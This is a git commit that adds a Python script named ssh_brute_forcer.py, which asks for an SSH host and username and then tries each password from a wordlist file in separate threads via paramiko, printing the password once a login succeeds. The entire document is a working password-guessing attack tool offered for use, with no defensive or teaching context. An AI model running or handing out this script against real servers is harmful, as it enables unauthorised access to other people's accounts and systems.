2576015c30f4224f5d70826b7c858f01b5ca5650
AntaresMugisho <antaresmugisho@gmail.com>
2022-12-05 11:37:03 +0200

    Add threaded SSH brute_forcer

---
+++ ssh_brute_forcer.py
@@ -0,0 +1,38 @@
+import paramiko, termcolor
+import sys, socket, time, threading
+
+password_found = False
+
+def ssh_connect(password):
+    global password_found
+
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        ssh.connect(host, port=22, password=password, username=username)
+        password_found = True
+        print(termcolor.colored(f"[+] Found password : {password}", "green"))
+    except paramiko.AuthenticationException:
+        print(termcolor.colored(f"[-] Incorrect login : {password}", "red"))
+    except socket.error as e:
+        print(termcolor.colored(f"[-] Can't establish connection", "yellow"))
+        print(f"Cause : {e}")
+
+    ssh.close()
+
+
+host = input("[*] Enter the SSH address : ")
+username = input("[*] Enter the SSH username : ")
+print(f"\n[*] Starting SSH bruteforce for {username}@{host}")
+
+with open("common.txt", "r") as file:
+    for line in file.readlines():
+        if password_found:
+            t.join()
+            exit()
+
+        password = line.strip()
+        t = threading.Thread(target=ssh_connect, args=(password,))
+        t.start()
+        time.sleep(0.5)
